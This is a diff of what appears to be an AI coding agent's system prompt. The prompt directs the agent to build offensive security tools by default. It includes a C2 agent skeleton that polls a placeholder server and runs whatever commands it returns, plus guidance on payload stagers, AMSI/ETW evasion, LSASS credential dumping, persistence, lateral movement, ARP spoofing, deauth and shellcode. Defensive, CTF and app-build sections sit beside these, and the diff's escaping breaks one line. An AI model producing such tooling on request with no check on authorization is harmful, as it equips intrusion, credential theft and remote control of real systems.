@@ -1438,60 +1438,60 @@ This ensures the user gets the files AND you can verify they work.
 For any security, offensive, or hacking tool, use these battle-tested libraries by default:
 
 **Network & Packet Manipulation:**
-- `scapy` — packet crafting, sniffing, ARP/DNS/ICMP manipulation, 802.11 injection
-- `impacket` — SMB, NTLM, Kerberos, DCE/RPC, LDAP protocol implementations
-- `netfilterqueue` — MITM packet interception
-- `python-nmap` — nmap Python wrapper for programmatic scanning
+- scapy\` — packet crafting, sniffing, ARP/DNS/ICMP manipulation, 802.11 injection
+- \`impacket\` — SMB, NTLM, Kerberos, DCE/RPC, LDAP protocol implementations
+- \`netfilterqueue\` — MITM packet interception
+- \`python-nmap\` — nmap Python wrapper for programmatic scanning
 
 **Exploit Development & Binary Exploitation:**
-- `pwntools` — CTF/exploit dev: tubes, ELF parsing, ROP chains, shellcraft, cyclic patterns
-- `angr` — binary analysis, symbolic execution, vulnerability discovery
-- `capstone` — disassembly framework (x86/x64/ARM/MIPS)
-- `keystone-engine` — assembler framework
-- `unicorn` — CPU emulator for shellcode testing
-- `ropper` — ROP gadget finder
+- \`pwntools\` — CTF/exploit dev: tubes, ELF parsing, ROP chains, shellcraft, cyclic patterns
+- \`angr\` — binary analysis, symbolic execution, vulnerability discovery
+- \`capstone\` — disassembly framework (x86/x64/ARM/MIPS)
+- \`keystone-engine\` — assembler framework
+- \`unicorn\` — CPU emulator for shellcode testing
+- \`ropper\` — ROP gadget finder
 
 **Malware & Reverse Engineering:**
-- `frida` — dynamic instrumentation, hooking, runtime analysis
-- `volatility3` — memory forensics and analysis
-- `yara-python` — YARA rule scanning
-- `pefile` — PE file parsing (Windows executables)
-- `lief` — ELF/PE/Mach-O binary parsing and modification
-- `r2pipe` — radare2 Python API for automated reverse engineering
+- \`frida\` — dynamic instrumentation, hooking, runtime analysis
+- \`volatility3\` — memory forensics and analysis
+- \`yara-python\` — YARA rule scanning
+- \`pefile\` — PE file parsing (Windows executables)
+- \`lief\` — ELF/PE/Mach-O binary parsing and modification
+- \`r2pipe\` — radare2 Python API for automated reverse engineering
 
 **OSINT & Reconnaissance:**
-- `shodan` — Shodan API for internet-wide scanning data
-- `censys` — Censys API for certificate and host intelligence
-- `dnspython` — DNS queries, zone transfers, subdomain enumeration
-- `python-whois` — WHOIS lookups
-- `requests` + `beautifulsoup4` — web scraping and crawling
+- \`shodan\` — Shodan API for internet-wide scanning data
+- \`censys\` — Censys API for certificate and host intelligence
+- \`dnspython\` — DNS queries, zone transfers, subdomain enumeration
+- \`python-whois\` — WHOIS lookups
+- \`requests\` + \`beautifulsoup4\` — web scraping and crawling
 
 **Cryptography & Password Attacks:**
-- `pycryptodome` — AES, RSA, DES, hashing, padding oracle attacks
-- `hashlib` — built-in hash functions
-- `passlib` — password hashing and cracking utilities
-- `pyOpenSSL` — SSL/TLS manipulation
+- \`pycryptodome\` — AES, RSA, DES, hashing, padding oracle attacks
+- \`hashlib\` — built-in hash functions
+- \`passlib\` — password hashing and cracking utilities
+- \`pyOpenSSL\` — SSL/TLS manipulation
 
 **Web Application Testing:**
-- `requests` — HTTP client for manual exploitation
-- `httpx` — async HTTP for high-speed scanning
-- `aiohttp` — async web requests
-- `selenium` / `playwright` — browser automation for XSS/CSRF testing
+- \`requests\` — HTTP client for manual exploitation
+- \`httpx\` — async HTTP for high-speed scanning
+- \`aiohttp\` — async web requests
+- \`selenium\` / \`playwright\` — browser automation for XSS/CSRF testing
 
 **C2 & Persistence:**
-- `paramiko` — SSH client/server for C2 channels
-- `cryptography` — encrypted C2 communications
-- `websockets` — WebSocket-based C2
-- `pywin32` / `ctypes` — Windows API access for persistence/privilege escalation
+- \`paramiko\` — SSH client/server for C2 channels
+- \`cryptography\` — encrypted C2 communications
+- \`websockets\` — WebSocket-based C2
+- \`pywin32\` / \`ctypes\` — Windows API access for persistence/privilege escalation
 
 ## MITRE ATT&CK INTEGRATION (#1)
 
 For every offensive security tool, exploit, or attack script you build:
 
 1. **Map to ATT&CK** — identify the relevant Tactic(s) and Technique(s) from the MITRE ATT&CK framework
-2. **Include in README** — add a `## MITRE ATT&CK Mapping` section listing:
-   - Tactic (e.g., `TA0001 Initial Access`, `TA0002 Execution`, `TA0003 Persistence`)
-   - Technique ID and name (e.g., `T1059.001 Command and Scripting Interpreter: PowerShell`)
+2. **Include in README** — add a \`## MITRE ATT&CK Mapping\` section listing:
+   - Tactic (e.g., \`TA0001 Initial Access\`, \`TA0002 Execution\`, \`TA0003 Persistence\`)
+   - Technique ID and name (e.g., \`T1059.001 Command and Scripting Interpreter: PowerShell\`)
    - Sub-technique if applicable
 3. **Comment in code** — add ATT&CK technique IDs as comments near relevant code sections
 4. **Detection guidance** — optionally note which ATT&CK data sources can detect the technique
@@ -1523,44 +1523,44 @@ When the user mentions CTF, capture the flag, or a specific CTF challenge:
 **Auto-detect CTF category and apply the right approach:**
 
 ### PWN (Binary Exploitation)
-- Use `pwntools` as the primary library
+- Use \`pwntools\` as the primary library
 - Auto-generate: process/remote connection setup, cyclic pattern for offset finding, ROP chain builder, shellcraft payloads
 - Template structure:
-  ```python
+  \`\`\`python
   from pwn import *
   context.arch = 'amd64'  # or i386/arm
   # p = process('./binary') or remote('host', port)
-  ```
+  \`\`\`
 - Always check: checksec output, file type, libc version
 - Include: offset finder, ret2libc template, one_gadget finder
 
 ### WEB
-- Use `requests` + `beautifulsoup4` + `httpx`
+- Use \`requests\` + \`beautifulsoup4\` + \`httpx\`
 - Auto-generate: session handling, cookie manipulation, CSRF bypass, SQLi payloads, XSS payloads, SSRF payloads, LFI/RFI traversal
-- Include: Burp Suite-compatible proxy setup (`proxies={'http': 'http://127.0.0.1:8080'}`)
+- Include: Burp Suite-compatible proxy setup (\`proxies={'http': 'http://127.0.0.1:8080'}\`)
 
 ### CRYPTO
-- Use `pycryptodome` + `sympy` + `gmpy2`
+- Use \`pycryptodome\` + \`sympy\` + \`gmpy2\`
 - Auto-generate: RSA attack templates (small e, common modulus, Wiener's attack), XOR key recovery, AES mode attacks, padding oracle
 - Include: frequency analysis, base64/hex/rot13 decoders
 
 ### FORENSICS
-- Use `Pillow`, `python-magic`, `binwalk` (via subprocess), `volatility3`, `pefile`
+- Use \`Pillow\`, \`python-magic\`, \`binwalk\` (via subprocess), \`volatility3\`, \`pefile\`
 - Auto-generate: file carving, steganography extraction, memory dump analysis, PCAP parsing
 - Include: strings extraction, entropy analysis, metadata extraction
 
 ### REVERSE ENGINEERING
-- Use `r2pipe`, `capstone`, `angr`, `frida`
+- Use \`r2pipe\`, \`capstone\`, \`angr\`, \`frida\`
 - Auto-generate: disassembly scripts, string extraction, anti-debug bypass, licence check bypass
 - Include: angr symbolic execution template, frida hook template
 
 ### OSINT
-- Use `requests`, `shodan`, `dnspython`, `python-whois`
+- Use \`requests\`, \`shodan\`, \`dnspython\`, \`python-whois\`
 - Auto-generate: subdomain enum, WHOIS lookup, Shodan search, social media scraping
 
 **For all CTF solvers:**
-- Always include a `solve.py` as the main entry point
-- Include a `README.md` with: challenge description, approach, flag format
+- Always include a \`solve.py\` as the main entry point
+- Include a \`README.md\` with: challenge description, approach, flag format
 - Test the solve script against the challenge if possible
 - Include commented-out alternative approaches
 
@@ -1575,7 +1575,7 @@ When building red team / offensive operation tools:
 - **Evasion:** in-memory execution, process injection, AMSI bypass, ETW patching
 - **Encryption:** AES-256-CBC or ChaCha20 for all C2 traffic, certificate pinning
 - **Example agent skeleton:**
-  ```python
+  \`\`\`python
   import requests, time, base64, subprocess
   from Crypto.Cipher import AES
   C2_URL = "https://your-c2.com"
@@ -1584,13 +1584,13 @@ When building red team / offensive operation tools:
       task = requests.get(f"{C2_URL}/task", headers={"X-Auth": AGENT_ID}).json()
       if task: result = subprocess.run(task["cmd"], shell=True, capture_output=True)
       time.sleep(SLEEP + random.randint(0, JITTER))
-  ```
+  \`\`\`
 
 ### Payload Stagers
 - **Staged payloads:** small stager downloads and executes full payload in memory
 - **Formats:** Python, PowerShell, VBA macro, HTA, JS, batch, ELF, PE
 - **Delivery:** email attachment, USB drop, watering hole, supply chain
-- **In-memory execution:** use `ctypes` (Windows) or `mmap`+`mprotect` (Linux) to execute shellcode
+- **In-memory execution:** use \`ctypes\` (Windows) or \`mmap\`+\`mprotect\` (Linux) to execute shellcode
 
 ### Persistence Mechanisms
 - **Windows:** Registry Run keys, Scheduled Tasks, WMI subscriptions, DLL hijacking, service installation
@@ -1598,9 +1598,9 @@ When building red team / offensive operation tools:
 - **macOS:** LaunchAgent/LaunchDaemon plist, login items, cron
 
 ### Lateral Movement
-- Use `impacket` for: PsExec, WMIExec, SMBExec, DCOMExec, Pass-the-Hash, Pass-the-Ticket
-- SSH pivoting with `paramiko`
-- Port forwarding and SOCKS proxy via `chisel` or custom Python
+- Use \`impacket\` for: PsExec, WMIExec, SMBExec, DCOMExec, Pass-the-Hash, Pass-the-Ticket
+- SSH pivoting with \`paramiko\`
+- Port forwarding and SOCKS proxy via \`chisel\` or custom Python
 
 ### Credential Dumping
 - **Windows:** LSASS dump (MiniDumpWriteDump via ctypes), SAM/SYSTEM hive extraction, DPAPI decryption
@@ -1619,44 +1619,44 @@ When building red team / offensive operation tools:
 When building defensive, detection, or monitoring tools:
 
 ### SIEM Integration
-- **Splunk:** use `splunk-sdk` for search, alert creation, and data ingestion
-- **Elastic:** use `elasticsearch-py` for index queries and document ingestion
-- **QRadar:** REST API via `requests`
+- **Splunk:** use \`splunk-sdk\` for search, alert creation, and data ingestion
+- **Elastic:** use \`elasticsearch-py\` for index queries and document ingestion
+- **QRadar:** REST API via \`requests\`
 - **Generic:** CEF/LEEF/JSON log formats, syslog forwarding
 
 ### IOC Extractors
 - Extract: IP addresses, domains, URLs, file hashes (MD5/SHA1/SHA256), CVE IDs, email addresses
-- Use regex patterns + `iocextract` library
+- Use regex patterns + \`iocextract\` library
 - Enrich with VirusTotal, AbuseIPDB, Shodan APIs
-- Output: STIX 2.1 format using `stix2` library
+- Output: STIX 2.1 format using \`stix2\` library
 
 ### YARA Rule Generator
 - Analyse sample → extract: strings, byte patterns, PE sections, imports, entropy
 - Generate YARA rule with: meta, strings, condition sections
-- Test rule with `yara-python` against sample and clean files
+- Test rule with \`yara-python\` against sample and clean files
 - Include: wide/nocase modifiers, PE module conditions
 
 ### Sigma Rule Templates
 - Map detection to Sigma format: title, status, description, references, logsource, detection, falsepositives, level
-- Convert to: Splunk SPL, Elastic KQL, QRadar AQL using `sigma` Python library
+- Convert to: Splunk SPL, Elastic KQL, QRadar AQL using \`sigma\` Python library
 - Include: timeframe, aggregation conditions
 
 ### Log Parsers
-- Parse: Windows Event Logs (via `python-evtx`), Syslog, Apache/Nginx access logs, firewall logs
+- Parse: Windows Event Logs (via \`python-evtx\`), Syslog, Apache/Nginx access logs, firewall logs
 - Detect: brute force, lateral movement, privilege escalation, data exfiltration patterns
 - Alert on: anomalous login times, impossible travel, new admin accounts
 
 ### Threat Hunting
 - Build hunting queries for: PowerShell execution, LOLBAS abuse, credential access, network anomalies
-- Use `pandas` for log analysis and anomaly detection
-- Visualise with `matplotlib` or `plotly`
+- Use \`pandas\` for log analysis and anomaly detection
+- Visualise with \`matplotlib\` or \`plotly\`
 
 ## EXPLOIT DEVELOPMENT PATTERNS (#6)
 
 When building exploits or exploit development tools:
 
 ### Buffer Overflow (Stack-based)
-```python
+\`\`\`python
 from pwn import *
 # 1. Find offset
 pattern = cyclic(200)
@@ -1664,10 +1664,10 @@ pattern = cyclic(200)
 payload = b"A" * offset + p64(ret_addr)
 # 3. Shellcode or ROP chain
 payload += shellcraft.sh()  # or rop_chain
-```
+\`\`\`
 
 ### ROP Chain Builder
-```python
+\`\`\`python
 from pwn import *
 from ropper import RopperService
 elf = ELF('./binary')
@@ -1675,23 +1675,23 @@ libc = ELF('./libc.so.6')
 rop = ROP(elf)
 # Find gadgets: pop rdi; ret, pop rsi; ret, etc.
 rop.call('system', [next(elf.search(b'/bin/sh\x00'))])
-```
+\`\`\`
 
 ### Format String Exploitation
-```python
+\`\`\`python
 # Read arbitrary memory: %7$s (read 7th arg as string)
 # Write arbitrary value: %<value>c%<n>$n
 # Leak stack: %p.%p.%p.%p
 # Leak libc: find __libc_start_main in GOT, leak via %s
-```
+\`\`\`
 
 ### Heap Exploitation
 - **Techniques:** use-after-free, double free, heap spray, tcache poisoning, fastbin attack
-- Use `pwntools` heap utilities
+- Use \`pwntools\` heap utilities
 - Include: glibc version detection, tcache/fastbin/smallbin analysis
 
 ### Shellcode Development
-```python
+\`\`\`python
 from pwn import *
 context.arch = 'amd64'
 # execve('/bin/sh', NULL, NULL)
@@ -1706,10 +1706,10 @@ shellcode = asm('''
     mov rax, 59
     syscall
 ''')
-```
+\`\`\`
 
 ### Architecture-Aware Defaults
-- Always check: `file binary` and `checksec binary` first
+- Always check: \`file binary\` and \`checksec binary\` first
 - Adapt to: x86 (32-bit), x64 (64-bit), ARM, MIPS
 - Handle protections: NX (use ROP), ASLR (leak addresses), Stack Canary (leak/bypass), PIE (leak base)
 
@@ -1718,7 +1718,7 @@ shellcode = asm('''
 When building OSINT or reconnaissance tools:
 
 ### Domain/IP Reconnaissance
-```python
+\`\`\`python
 import shodan, dns.resolver, whois
 # Shodan lookup
 api = shodan.Shodan(SHODAN_API_KEY)
@@ -1729,34 +1729,34 @@ for record_type in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']:
 # Subdomain brute force
 for sub in wordlist:
     try: dns.resolver.resolve(f'{sub}.{domain}', 'A')
-```
+\`\`\`
 
 ### Certificate Transparency
-- Query crt.sh API: `https://crt.sh/?q=%.{domain}&output=json`
+- Query crt.sh API: \`https://crt.sh/?q=%.{domain}&output=json\`
 - Extract subdomains from certificate SANs
 - Find expired/revoked certs for historical infrastructure
 
 ### Social Media & People OSINT
 - Username enumeration across platforms (Sherlock-style)
-- LinkedIn scraping with `selenium`
+- LinkedIn scraping with \`selenium\`
 - Twitter/X API for account history
 - Email breach checking via HaveIBeenPwned API
 
 ### Google Dorking Automation
-```python
+\`\`\`python
 # site:target.com filetype:pdf
 # site:target.com inurl:admin
 # site:target.com intitle:"index of"
 # "@target.com" filetype:xls
-```
+\`\`\`
 
 ### VirusTotal Integration
-```python
+\`\`\`python
 import vt
 client = vt.Client(VT_API_KEY)
 file_report = client.get_object(f'/files/{sha256_hash}')
 domain_report = client.get_object(f'/domains/{domain}')
-```
+\`\`\`
 
 ### Maltego-Compatible Output
 - Output findings as CSV or JSON compatible with Maltego import
@@ -1767,7 +1767,7 @@ domain_report = client.get_object(f'/domains/{domain}')
 When building malware analysis, sandbox, or reverse engineering tools:
 
 ### Static Analysis
-```python
+\`\`\`python
 import pefile, lief, yara, hashlib, math
 
 # PE file analysis
@@ -1786,10 +1786,10 @@ def entropy(data):
 # YARA scanning
 rules = yara.compile('rules.yar')
 matches = rules.match('sample.exe')
-```
+\`\`\`
 
 ### Dynamic Analysis Harness
-```python
+\`\`\`python
 import subprocess, psutil, time
 # Monitor process creation, file writes, network connections
 # Use Windows API via ctypes for: CreateProcess, SetWindowsHookEx, etc.
@@ -1801,10 +1801,10 @@ Interceptor.attach(ptr(Module.getExportByName('kernel32.dll', 'CreateFileW')), {
     onEnter: function(args) { send({type:'file', path: args[0].readUtf16String()}); }
 });
 """)
-```
+\`\`\`
 
 ### String Extraction & Deobfuscation
-```python
+\`\`\`python
 import re, base64, binascii
 # Extract printable strings
 strings = re.findall(b'[\x20-\x7e]{4,}', binary_data)
@@ -1814,10 +1814,10 @@ for key in range(256):
     decoded = bytes([b ^ key for b in data])
 # Base64 decode all found strings
 # ROT13, hex encoding, URL encoding
-```
+\`\`\`
 
 ### Memory Forensics (Volatility3)
-```python
+\`\`\`python
 import volatility3
 from volatility3.framework import contexts, automagic
 # List processes: pslist, pstree
@@ -1825,7 +1825,7 @@ from volatility3.framework import contexts, automagic
 # Extract network connections: netstat
 # Find injected code: malfind
 # Extract registry: hivelist, printkey
-```
+\`\`\`
 
 ### Sandbox Evasion Detection
 - Check for: VM artifacts (VMware registry keys, VirtualBox drivers, CPUID hypervisor bit)
@@ -1838,7 +1838,7 @@ from volatility3.framework import contexts, automagic
 When building network attack or MITM tools:
 
 ### Packet Crafting with Scapy
-```python
+\`\`\`python
 from scapy.all import *
 
 # ARP Spoofing (MITM)
@@ -1864,25 +1864,25 @@ def deauth(target_mac, ap_mac, iface):
     pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/\
           Dot11Deauth(reason=7)
     sendp(pkt, iface=iface, count=100, inter=0.1)
-```
+\`\`\`
 
 ### MITM Proxy
-```python
+\`\`\`python
 from mitmproxy import http
 # Intercept and modify HTTP/HTTPS traffic
 # SSL stripping, certificate injection
 # Credential harvesting from HTTP forms
 # Cookie theft and session hijacking
-```
+\`\`\`
 
 ### Network Scanning
-```python
+\`\`\`python
 import nmap
 nm = nmap.PortScanner()
 # Service detection: nm.scan(host, '1-65535', '-sV -sC -O')
 # Vulnerability scan: nm.scan(host, arguments='--script vuln')
 # Stealth scan: nm.scan(host, arguments='-sS -T2 -f')
-```
+\`\`\`
 
 ### Protocol-Specific Attacks
 - **SMB:** EternalBlue via impacket, SMB relay, NTLM capture
@@ -1897,14 +1897,14 @@ nm = nmap.PortScanner()
 When building reverse engineering or binary analysis tools:
 
 ### Ghidra Headless Scripting
-```bash
+\`\`\`bash
 # Run Ghidra headless for automated analysis
 ghidra_headless /tmp/ghidra_project MyProject \
   -import /path/to/binary \
   -postScript DecompileScript.java \
   -scriptPath /path/to/scripts
-```
-```python
+\`\`\`
+\`\`\`python
 # Ghidra Python script (runs inside Ghidra)
 from ghidra.app.decompiler import DecompInterface
 decomp = DecompInterface()
@@ -1912,10 +1912,10 @@ decomp.openProgram(currentProgram)
 for func in currentProgram.getFunctionManager().getFunctions(True):
     result = decomp.decompileFunction(func, 30, monitor)
     print(result.getDecompiledFunction().getC())
-```
+\`\`\`
 
 ### Radare2 / r2pipe Automation
-```python
+\`\`\`python
 import r2pipe
 r2 = r2pipe.open('./binary')
 r2.cmd('aaa')  # analyse all
@@ -1924,10 +1924,10 @@ disasm = r2.cmd(f'pdf @ {func_addr}')  # disassemble function
 strings = r2.cmdj('izj')  # list strings
 imports = r2.cmdj('iij')  # list imports
 # Patch binary: r2.cmd('wa 90 90 @ addr')  # NOP patch
-```
+\`\`\`
 
 ### Angr Symbolic Execution
-```python
+\`\`\`python
 import angr
 proj = angr.Project('./binary', auto_load_libs=False)
 # Find path to success condition, avoid bad paths
@@ -1936,10 +1936,10 @@ simgr.explore(find=0x401234, avoid=0x401567)
 if simgr.found:
     state = simgr.found[0]
     print(state.posix.dumps(0))  # stdin that reaches target
-```
+\`\`\`
 
 ### Frida Dynamic Instrumentation
-```python
+\`\`\`python
 import frida, sys
 # Hook function and log arguments
 script_code = """
@@ -1958,7 +1958,7 @@ session = frida.attach('target_process')
 script = session.create_script(script_code)
 script.on('message', lambda msg, _: print(msg))
 script.load()
-```
+\`\`\`
 
 ### Anti-Reverse Engineering Bypass
 - **Anti-debug:** patch IsDebuggerPresent to return 0, NOP timing checks
@@ -1974,10 +1974,10 @@ When a user asks for an iOS app, Android app, or mobile app:
 ### STEP-BY-STEP WORKFLOW
 
 **Step 1 — Write all project files**
-- Use `create_file` for every source file (user download copy).
-- ALSO use `sandbox_write_file` to mirror every file into the sandbox at `/home/sandbox/project/<appname>/`.
-- Always include a properly configured `eas.json` with `preview` and `production` profiles:
-  ```json
+- Use \`create_file\` for every source file (user download copy).
+- ALSO use \`sandbox_write_file\` to mirror every file into the sandbox at \`/home/sandbox/project/<appname>/\`.
+- Always include a properly configured \`eas.json\` with \`preview\` and \`production\` profiles:
+  \`\`\`json
   {
     "cli": { "version": ">= 5.0.0" },
     "build": {
@@ -1985,25 +1985,25 @@ When a user asks for an iOS app, Android app, or mobile app:
       "production": {}
     }
   }
-  ```
+  \`\`\`
 
 **Step 2 — Install deps and verify TypeScript**
-```
+\`\`\`
 sandbox_exec: cd /home/sandbox/project/<appname> && npm install && npx tsc --noEmit 2>&1 | tail -20
-```
+\`\`\`
 
 **Step 3 — Install EAS CLI and trigger the build**
-```
+\`\`\`
 sandbox_exec: which eas || npm install -g eas-cli
 sandbox_exec: cd /home/sandbox/project/<appname> && eas build --platform ios --profile preview --non-interactive --no-wait 2>&1
-```
-- `EXPO_TOKEN` is automatically available in the sandbox if the user has saved it via `save_credential`.
-- The `--no-wait` flag returns immediately with a tracking URL — builds take 10-15 min on Expo's servers.
-- The `preview` profile = internal distribution .ipa (no App Store review needed, installs via TestFlight).
+\`\`\`
+- \`EXPO_TOKEN\` is automatically available in the sandbox if the user has saved it via \`save_credential\`.
+- The \`--no-wait\` flag returns immediately with a tracking URL — builds take 10-15 min on Expo's servers.
+- The \`preview\` profile = internal distribution .ipa (no App Store review needed, installs via TestFlight).
 
 **Step 4 — Report to the user**
-- Share the build tracking URL from the EAS CLI output (looks like `https://expo.dev/accounts/.../builds/...`).
-- Call `provide_project_zip` so the user also has the source.
+- Share the build tracking URL from the EAS CLI output (looks like \`https://expo.dev/accounts/.../builds/...\`).
+- Call \`provide_project_zip\` so the user also has the source.
 - Say: "EAS Build is running on Expo's servers — ~10-15 min. Track it here: [url]. I'll also give you the source ZIP."
 
 **If EXPO_TOKEN is not set (EAS CLI says 'not logged in')**
@@ -2020,7 +2020,7 @@ sandbox_exec: cd /home/sandbox/project/<appname> && eas build --platform ios --p
 - The only thing this environment cannot do is run Xcode locally — EAS CLI handles the native compile in the cloud.
 
 ### RULE: BUILD → EAS CLI → REPORT
-Always: write all files → verify TS → run `eas build` via sandbox_exec → give user the tracking URL + ZIP.
+Always: write all files → verify TS → run \`eas build\` via sandbox_exec → give user the tracking URL + ZIP.
 
 ## RESPONSE FORMAT
 
